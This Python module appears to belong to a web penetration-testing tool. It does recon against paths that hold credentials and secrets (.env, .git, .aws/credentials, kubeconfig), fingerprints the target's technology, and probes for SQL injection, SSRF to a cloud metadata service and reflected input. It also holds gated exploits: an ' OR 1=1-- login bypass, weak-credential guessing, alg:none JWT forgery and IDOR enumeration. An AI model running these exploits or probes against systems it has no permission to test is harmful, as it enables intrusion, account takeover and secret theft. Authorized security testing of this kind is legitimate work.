from __future__ import annotations

import base64
import json
import re
from typing import Any
from urllib.parse import urlparse

from http_client import HttpClient, Response
from vapt_mvp import Evidence, Finding
from exploits import run_exploits, EXPLOIT_CATEGORIES
from crawler import crawl_target, CrawlResult


# ============================================================
# RECON PATH INVENTORY - Comprehensive, categorized paths
# ============================================================

# Universal paths that apply to almost any web target
UNIVERSAL_RECON_PATHS = [
    # Standard well-known
    "/robots.txt",
    "/sitemap.xml",
    "/sitemap_index.xml",
    "/.well-known/security.txt",
    "/.well-known/change-password",
    "/.well-known/host-meta",
    "/.well-known/webfinger",
    
    # Common directories
    "/admin/",
    "/administrator/",
    "/login/",
    "/wp-login.php",
    "/wp-admin/",
    "/phpmyadmin/",
    "/adminer.php",
    "/manager/html",
    "/console/",
    "/dashboard/",
    "/api/",
    "/api/v1/",
    "/api/v2/",
    "/graphql",
    "/graphql/",
    "/health",
    "/healthz",
    "/ready",
    "/metrics",
    "/actuator/health",
    "/actuator/info",
    "/actuator/metrics",
    "/actuator/env",
    "/actuator/beans",
    "/actuator/mappings",
    "/swagger",
    "/swagger/",
    "/swagger.json",
    "/swagger.yaml",
    "/openapi",
    "/openapi.json",
    "/openapi.yaml",
    "/api-docs",
    "/api-docs/",
    "/docs",
    "/docs/",
    "/redoc",
    "/redoc/",
    "/.env",
    "/.env.local",
    "/.env.production",
    "/.git/config",
    "/.git/HEAD",
    "/.svn/entries",
    "/.htaccess",
    "/web.config",
    "/crossdomain.xml",
    "/clientaccesspolicy.xml",
    "/robots.txt",
    "/humans.txt",
    "/security.txt",
    "/README.md",
    "/README.txt",
    "/CHANGELOG.md",
    "/LICENSE",
    "/LICENSE.txt",
    "/composer.json",
    "/package.json",
    "/package-lock.json",
    "/yarn.lock",
    "/Gemfile",
    "/Gemfile.lock",
    "/requirements.txt",
    "/Pipfile",
    "/Pipfile.lock",
    "/go.mod",
    "/go.sum",
    "/pom.xml",
    "/build.gradle",
    "/Dockerfile",
    "/docker-compose.yml",
    "/docker-compose.yaml",
    "/.dockerignore",
    "/Vagrantfile",
    "/ansible.cfg",
    "/Jenkinsfile",
    "/.github/workflows/",
    "/.gitlab-ci.yml",
    "/bitbucket-pipelines.yml",
]

# Technology-specific paths (detected via headers/content)
TECHNOLOGY_PATHS = {
    "wordpress": [
        "/wp-json/wp/v2/users",
        "/wp-json/wp/v2/posts",
        "/wp-json/wp/v2/pages",
        "/wp-json/wp/v2/media",
        "/wp-json/wp/v2/comments",
        "/wp-json/wp/v2/types",
        "/wp-json/wp/v2/taxonomies",
        "/wp-includes/",
        "/wp-content/",
        "/wp-content/uploads/",
        "/wp-content/plugins/",
        "/wp-content/themes/",
        "/xmlrpc.php",
        "/wp-cron.php",
        "/wp-links-opml.php",
        "/wp-load.php",
        "/wp-mail.php",
        "/wp-settings.php",
        "/wp-signup.php",
        "/wp-trackback.php",
    ],
    "drupal": [
        "/user/login",
        "/user/register",
        "/admin/",
        "/admin/config",
        "/admin/reports",
        "/admin/structure",
        "/admin/modules",
        "/admin/themes",
        "/admin/people",
        "/admin/config/services",
        "/core/",
        "/modules/",
        "/themes/",
        "/profiles/",
        "/sites/default/files/",
        "/sites/default/settings.php",
        "/update.php",
        "/install.php",
        "/cron.php",
        "/authorize.php",
    ],
    "joomla": [
        "/administrator/",
        "/administrator/index.php",
        "/components/",
        "/modules/",
        "/plugins/",
        "/templates/",
        "/language/",
        "/libraries/",
        "/media/",
        "/tmp/",
        "/logs/",
        "/cache/",
        "/configuration.php",
        "/htaccess.txt",
        "/web.config.txt",
    ],
    "magento": [
        "/admin/",
        "/downloader/",
        "/downloader/index.php",
        "/app/etc/local.xml",
        "/app/etc/env.php",
        "/var/log/",
        "/var/report/",
        "/var/cache/",
        "/var/session/",
        "/pub/media/",
        "/pub/static/",
        "/setup/",
        "/update/",
        "/php.ini",
        "/.htaccess",
    ],
    "laravel": [
        "/storage/logs/laravel.log",
        "/storage/logs/",
        "/storage/app/",
        "/storage/framework/",
        "/bootstrap/cache/",
        "/vendor/composer/",
        "/vendor/laravel/",
        "/.env",
        "/.env.example",
        "/artisan",
        "/server.php",
        "/webpack.mix.js",
    ],
    "django": [
        "/admin/",
        "/admin/login/",
        "/static/",
        "/media/",
        "/api/",
        "/api-auth/",
        "/__debug__/",
        "/robots.txt",
        "/sitemap.xml",
        "/health/",
        "/healthz/",
        "/metrics/",
        "/.well-known/security.txt",
    ],
    "spring": [
        "/actuator/",
        "/actuator/health",
        "/actuator/info",
        "/actuator/metrics",
        "/actuator/env",
        "/actuator/beans",
        "/actuator/mappings",
        "/actuator/heapdump",
        "/actuator/threaddump",
        "/actuator/loggers",
        "/actuator/logfile",
        "/actuator/conditions",
        "/actuator/configprops",
        "/actuator/scheduledtasks",
        "/actuator/httptrace",
        "/h2-console/",
        "/h2-console/login.jsp",
        "/console/",
        "/swagger-ui.html",
        "/swagger-ui/",
        "/v2/api-docs",
        "/v3/api-docs",
    ],
    "express": [
        "/api/",
        "/api/v1/",
        "/api/v2/",
        "/graphql",
        "/graphql/",
        "/health",
        "/healthz",
        "/ready",
        "/metrics",
        "/debug",
        "/debug/pprof",
        "/status",
        "/ping",
    ],
    "rails": [
        "/rails/info/routes",
        "/rails/info/properties",
        "/rails/mailers",
        "/sidekiq",
        "/sidekiq/",
        "/sidekiq/stats",
        "/sidekiq/busy",
        "/sidekiq/retries",
        "/sidekiq/scheduled",
        "/sidekiq/queues",
        "/sidekiq/processes",
        "/assets/",
        "/packs/",
        "/cable/",
        "/actioncable/",
    ],
    "node": [
        "/package.json",
        "/package-lock.json",
        "/yarn.lock",
        "/pnpm-lock.yaml",
        "/node_modules/",
        "/.npmrc",
        "/.nvmrc",
        "/tsconfig.json",
        "/webpack.config.js",
        "/vite.config.js",
        "/next.config.js",
        "/nuxt.config.js",
    ],
    "python": [
        "/requirements.txt",
        "/requirements/",
        "/setup.py",
        "/setup.cfg",
        "/pyproject.toml",
        "/Pipfile",
        "/Pipfile.lock",
        "/poetry.lock",
        "/.python-version",
        "/venv/",
        "/env/",
        "/__pycache__/",
        "/*.pyc",
    ],
    "go": [
        "/go.mod",
        "/go.sum",
        "/vendor/",
        "/Gopkg.lock",
        "/Gopkg.toml",
        "/main.go",
        "/cmd/",
        "/internal/",
        "/pkg/",
        "/api/",
        "/docs/",
    ],
    "java": [
        "/pom.xml",
        "/build.gradle",
        "/build.gradle.kts",
        "/settings.gradle",
        "/settings.gradle.kts",
        "/gradle.properties",
        "/gradlew",
        "/gradlew.bat",
        "/mvnw",
        "/mvnw.cmd",
        "/src/main/java/",
        "/src/main/resources/",
        "/src/test/",
        "/target/",
        "/build/",
        "/out/",
    ],
    "php": [
        "/composer.json",
        "/composer.lock",
        "/vendor/",
        "/vendor/composer/",
        "/.php-version",
        "/php.ini",
        "/.user.ini",
        "/phpunit.xml",
        "/phpunit.xml.dist",
        "/phpcs.xml",
        "/phpstan.neon",
        "/psalm.xml",
    ],
    "ruby": [
        "/Gemfile",
        "/Gemfile.lock",
        "/Rakefile",
        "/config.ru",
        "/.ruby-version",
        "/.rbenv-version",
        "/.rvmrc",
        "/vendor/bundle/",
        "/bundle/",
        "/spec/",
        "/test/",
        "/features/",
    ],
    "dotnet": [
        "/*.csproj",
        "/*.sln",
        "/*.fsproj",
        "/*.vbproj",
        "/packages.config",
        "/project.json",
        "/global.json",
        "/NuGet.config",
        "/Directory.Build.props",
        "/Directory.Build.targets",
        "/bin/",
        "/obj/",
        "/Properties/",
        "/wwwroot/",
        "/appsettings.json",
        "/appsettings.Development.json",
    ],
    "kubernetes": [
        "/.kube/",
        "/.kube/config",
        "/kubeconfig",
        "/kubectl/",
        "/.helm/",
        "/.helm/repository/",
        "/.helm/repository/repositories.yaml",
        "/.kube/cache/",
        "/.kube/http-cache/",
    ],
    "docker": [
        "/Dockerfile",
        "/docker-compose.yml",
        "/docker-compose.yaml",
        "/docker-compose.override.yml",
        "/docker-compose.prod.yml",
        "/docker-compose.dev.yml",
        "/.dockerignore",
        "/docker/",
        "/.docker/",
        "/Dockerfile.*",
        "/*.dockerfile",
    ],
    "aws": [
        "/.aws/",
        "/.aws/config",
        "/.aws/credentials",
        "/.aws/credentials.bak",
        "/.aws/cli/",
        "/.aws/sso/",
        "/.aws/models/",
    ],
    "azure": [
        "/.azure/",
        "/.azure/config",
        "/.azure/credentials",
        "/.azure/accessTokens.json",
        "/.azure/clouds.config",
    ],
    "gcp": [
        "/.config/gcloud/",
        "/.config/gcloud/active_config",
        "/.config/gcloud/configurations/",
        "/.config/gcloud/credentials/",
        "/.config/gcloud/legacy_credentials/",
    ],
}

# Paths that should be checked based on URL patterns
PATH_PATTERNS = {
    # API endpoints
    r"/api/": [
        "/api",
        "/api/",
        "/api/v1",
        "/api/v1/",
        "/api/v2",
        "/api/v2/",
        "/api/docs",
        "/api/swagger",
        "/api/swagger.json",
        "/api/openapi.json",
        "/api/openapi.yaml",
    ],
    # Admin panels
    r"/admin": [
        "/admin",
        "/admin/",
        "/admin/login",
        "/admin/login/",
        "/admin/dashboard",
        "/admin/dashboard/",
        "/administrator",
        "/administrator/",
        "/administrator/index.php",
        "/manager",
        "/manager/",
        "/manager/html",
        "/console",
        "/console/",
        "/dashboard",
        "/dashboard/",
    ],
    # GraphQL
    r"/graphql": [
        "/graphql",
        "/graphql/",
        "/graphiql",
        "/graphiql/",
        "/playground",
        "/playground/",
        "/altair",
        "/altair/",
        "/voyager",
        "/voyager/",
    ],
    # Webhooks
    r"/webhook": [
        "/webhook",
        "/webhook/",
        "/webhooks",
        "/webhooks/",
        "/callback",
        "/callback/",
        "/callbacks",
        "/callbacks/",
        "/notify",
        "/notify/",
        "/ipn",
        "/ipn/",
    ],
    # File upload
    r"/upload": [
        "/upload",
        "/upload/",
        "/uploads",
        "/uploads/",
        "/files",
        "/files/",
        "/media",
        "/media/",
        "/assets",
        "/assets/",
        "/static",
        "/static/",
        "/public",
        "/public/",
    ],
    # Auth
    r"/auth": [
        "/auth",
        "/auth/",
        "/auth/login",
        "/auth/login/",
        "/auth/register",
        "/auth/register/",
        "/auth/logout",
        "/auth/logout/",
        "/auth/forgot-password",
        "/auth/reset-password",
        "/oauth",
        "/oauth/",
        "/oauth/authorize",
        "/oauth/token",
        "/oauth/callback",
        "/sso",
        "/sso/",
        "/saml",
        "/saml/",
        "/oidc",
        "/oidc/",
    ],
}


def get_dynamic_recon_paths(base_url: str, technology: str | None = None) -> list[str]:
    """Generate dynamic recon paths based on target URL and detected technology."""
    paths = list(UNIVERSAL_RECON_PATHS)
    
    parsed = urlparse(base_url)
    path = parsed.path.rstrip("/")
    
    # Add technology-specific paths
    if technology and technology.lower() in TECHNOLOGY_PATHS:
        paths.extend(TECHNOLOGY_PATHS[technology.lower()])
    
    # Add pattern-based paths
    for pattern, pattern_paths in PATH_PATTERNS.items():
        if re.search(pattern, path, re.IGNORECASE):
            paths.extend(pattern_paths)
    
    # Add paths based on URL structure
    if path and path != "/":
        # Add parent paths
        parts = path.strip("/").split("/")
        for i in range(1, len(parts) + 1):
            parent = "/" + "/".join(parts[:i])
            if parent not in paths:
                paths.append(parent)
            if parent + "/" not in paths:
                paths.append(parent + "/")
    
    # Deduplicate while preserving order
    seen = set()
    unique_paths = []
    for p in paths:
        if p not in seen:
            seen.add(p)
            unique_paths.append(p)
    
    return unique_paths


def detect_technology(headers: dict[str, str], body: str = "") -> str | None:
    """Detect technology stack from headers and body content."""
    server = headers.get("Server", "").lower()
    powered_by = headers.get("X-Powered-By", "").lower()
    generator = headers.get("X-Generator", "").lower()
    content_type = headers.get("Content-Type", "").lower()
    set_cookie = headers.get("Set-Cookie", "").lower()
    
    all_signals = f"{server} {powered_by} {generator} {content_type} {set_cookie} {body[:5000]}".lower()
    
    tech_signatures = {
        "wordpress": ["wordpress", "wp-content", "wp-includes", "wp-json"],
        "drupal": ["drupal", "drupal.settings", "drupal.core"],
        "joomla": ["joomla", "joomla!"],
        "magento": ["magento", "mage.cookies"],
        "laravel": ["laravel", "laravel_session"],
        "django": ["django", "csrftoken", "sessionid"],
        "spring": ["spring", "spring boot", "spring-session"],
        "express": ["express", "x-powered-by: express"],
        "rails": ["rails", "ruby on rails", "_session_id"],
        "node": ["node.js", "next.js", "nuxt.js", "nestjs"],
        "python": ["python", "gunicorn", "uwsgi", "waitress"],
        "go": ["go", "golang", "gin-gonic", "echo"],
        "java": ["tomcat", "jetty", "wildfly", "jboss", "weblogic", "websphere"],
        "php": ["php", "php-fpm", "php/"],
        "ruby": ["ruby", "rack", "passenger", "puma"],
        "dotnet": ["asp.net", "asp.net core", "kestrel", "iis"],
        "kubernetes": ["kubernetes", "k8s"],
        "docker": ["docker", "containerd"],
        "aws": ["aws", "amazon", "cloudfront", "elb"],
        "azure": ["azure", "microsoft-iis"],
        "gcp": ["google", "gcp", "gae", "cloud run"],
    }
    
    for tech, signatures in tech_signatures.items():
        if any(sig in all_signals for sig in signatures):
            return tech
    
    return None


# Keep backward compatibility
RECON_PATHS = UNIVERSAL_RECON_PATHS
MARKER = "vaptprobe8731"


def _json(resp: Response) -> Any:
    try:
        return json.loads(resp.text)
    except (ValueError, TypeError):
        return None


def _token(data: Any) -> str | None:
    if isinstance(data, dict):
        auth = data.get("authentication")
        if isinstance(auth, dict) and auth.get("token"):
            return str(auth["token"])
        if data.get("token"):
            return str(data["token"])
    return None


def _require(approved: bool) -> None:
    if not approved:
        raise PermissionError("exploitation requires an approved exploit token")


def _probe_technology(client: HttpClient) -> str | None:
    """Quick probe to detect technology stack."""
    try:
        resp = client.get("/")
        return detect_technology(resp.headers, resp.text)
    except Exception:
        return None


def _get_base_url(client: HttpClient) -> str:
    """Get base URL from client, with fallback."""
    if hasattr(client, 'scope') and hasattr(client.scope, 'base_url'):
        return client.scope.base_url()
    return "http://unknown/"


# --- Recon (auto) --------------------------------------------------------
def recon(client: HttpClient) -> list[dict[str, Any]]:
    """Perform reconnaissance using dynamic paths based on target."""
    # First, probe to detect technology
    technology = _probe_technology(client)
    
    # Get dynamic paths based on target URL and detected technology
    base_url = _get_base_url(client)
    dynamic_paths = get_dynamic_recon_paths(base_url, technology)
    
    results: list[dict[str, Any]] = []
    for path in dynamic_paths:
        try:
            resp = client.get(path)
            results.append({"path": path, "status": resp.status, "content_type": resp.headers.get("Content-Type")})
        except Exception as error:
            results.append({"path": path, "status": None, "error": str(error)})
    return results


def deep_crawl(client: HttpClient, max_depth: int = 3, max_pages: int = 100) -> CrawlResult:
    """Perform deep crawling to discover attack surface."""
    return crawl_target(client, client.scope.base_url() + "/", max_depth=max_depth, max_pages=max_pages)


# --- Detection (auto, low impact) ---------------------------------------
def detect_sql_injection(client: HttpClient) -> Finding | None:
    """Generic SQL injection detection."""
    test_endpoints = ["/login", "/search", "/api/users", "/api/products", "/"]
    for endpoint in test_endpoints:
        try:
            resp = client.post(endpoint, json={"username": "'", "password": "test"})
            if resp.status >= 500 and any(p in resp.text.lower() for p in ["sql", "syntax", "sqlite", "mysql", "postgresql", "ora-"]):
                return Finding(
                    "sqli-login-error", "SQL error triggered on login endpoint", "high",
                    "A single quote in the login field produced a database error, indicating input is concatenated into a SQL query.",
                    [Evidence("response", {"status": resp.status, "snippet": resp.text[:200]})],
                    remediation="Use parameterized queries / an ORM for authentication lookups.")
        except Exception:
            continue
    return None


def detect_reflected_input(client: HttpClient) -> Finding | None:
    """Generic reflected input detection (XSS precursor)."""
    test_endpoints = ["/search", "/q", "/api/search", "/"]
    for endpoint in test_endpoints:
        try:
            resp = client.get(f"{endpoint}?q={MARKER}")
            if MARKER in resp.text:
                return Finding(
                    "reflected-search-input", "Search input reflected in response", "medium",
                    "The endpoint reflects the raw query back in its response, a precursor to XSS if rendered unsafely.",
                    [Evidence("response", {"status": resp.status, "reflected": True})], confidence="medium",
                    remediation="Encode user input on output and apply a strict Content-Security-Policy.")
        except Exception:
            continue
    return None


def detect_ssrf(client: HttpClient) -> Finding | None:
    """Generic SSRF detection."""
    test_endpoints = ["/fetch", "/proxy", "/api/fetch", "/webhook", "/import"]
    for endpoint in test_endpoints:
        try:
            resp = client.post(endpoint, json={"url": "http://169.254.169.254/latest/meta-data/"})
            if "ami-id" in resp.text or "instance-id" in resp.text:
                return Finding(
                    "ssrf-metadata", "SSRF: Internal metadata service accessible", "critical",
                    "The fetch endpoint can reach internal cloud metadata service.",
                    [Evidence("response", {"status": resp.status, "snippet": resp.text[:200]})],
                    remediation="Block access to internal IP ranges. Validate and sanitize user-supplied URLs.")
        except Exception:
            continue
    return None


# --- Exploitation (gated: approved=True required) ------------------------
def exploit_sql_login_bypass(client: HttpClient, approved: bool) -> tuple[Finding | None, str | None]:
    _require(approved)
    resp = client.post("/login", json={"username": "' OR 1=1--", "password": "x"})
    token = _token(_json(resp))
    if resp.status == 200 and token:
        return (Finding(
            "sqli-auth-bypass", "Authentication bypass via SQL injection", "critical",
            "A SQL injection payload in the login field returned a valid session token without valid credentials.",
            [Evidence("auth_token_prefix", token[:12] + "..."), Evidence("payload", "' OR 1=1--")],
            remediation="Use parameterized queries for authentication; never concatenate input into SQL."), token)
    return (None, None)


def exploit_generic(client: HttpClient, approved: bool, categories: list[str] | None = None,
                    endpoints: list[str] | None = None) -> list[Finding]:
    """Run generic exploit modules against the target."""
    _require(approved)
    return run_exploits(client, categories=categories, endpoints=endpoints)


def exploit_weak_login(client: HttpClient, approved: bool, candidates: list[dict[str, str]]) -> tuple[Finding | None, str | None]:
    _require(approved)
    for cred in candidates:
        resp = client.post("/login", json={"username": cred.get("username", cred.get("email")), "password": cred.get("password")})
        token = _token(_json(resp))
        if resp.status == 200 and token:
            return (Finding(
                "weak-credentials", "Weak or default credentials accepted", "high",
                f"The account {cred.get('username', cred.get('email'))} authenticated with a weak password.",
                [Evidence("account", cred.get("username", cred.get("email")))],
                remediation="Enforce a strong password policy and disable default/test accounts."), token)
    return (None, None)


def _forge_jwt_none(email: str) -> str:
    def seg(obj: Any) -> str:
        return base64.urlsafe_b64encode(json.dumps(obj, separators=(",", ":")).encode()).rstrip(b"=").decode()
    return f"{seg({'alg': 'none', 'typ': 'JWT'})}.{seg({'data': {'email': email, 'role': 'admin'}, 'iat': 0})}."


def exploit_jwt_none(client: HttpClient, approved: bool, email: str = "admin@example.com",
                     probe_path: str = "/api/user") -> Finding | None:
    _require(approved)
    token = _forge_jwt_none(email)
    resp = client.get(probe_path, headers={"Authorization": f"Bearer {token}"})
    if resp.status == 200 and _json(resp) is not None:
        return Finding(
            "jwt-none-accepted", "Forged 'alg:none' JWT accepted", "critical",
            "The API accepted a JWT signed with the 'none' algorithm, allowing token forgery and identity spoofing.",
            [Evidence("probe_path", probe_path), Evidence("forged_token_prefix", token[:16] + "...")],
            remediation="Reject tokens whose alg is 'none'; pin the expected signing algorithm server-side.")
    return None


def exploit_idor(client: HttpClient, approved: bool, token: str | None,
                 object_ids: list[int] | None = None) -> Finding | None:
    """Generic IDOR test - tries to access other users' resources."""
    _require(approved)
    if not token:
        return None

    object_ids = object_ids or [1, 2, 3, 4, 5, 10, 100]
    base_paths = ["/api/users", "/api/orders", "/api/documents", "/api/accounts", "/api/baskets"]

    for base_path in base_paths:
        for obj_id in object_ids:
            try:
                resp = client.get(f"{base_path}/{obj_id}", headers={"Authorization": f"Bearer {token}"})
                if resp.status == 200 and _json(resp):
                    return Finding(
                        f"idor-{base_path.split('/')[-1]}", f"Insecure direct object reference on {base_path.split('/')[-1]}", "high",
                        f"Authenticated session could access {base_path} id {obj_id} belonging to another user.",
                        [Evidence("accessed_object", obj_id), Evidence("endpoint", base_path), Evidence("status", resp.status)],
                        remediation="Enforce per-user authorization checks on every object access.")
            except Exception:
                continue
    return None
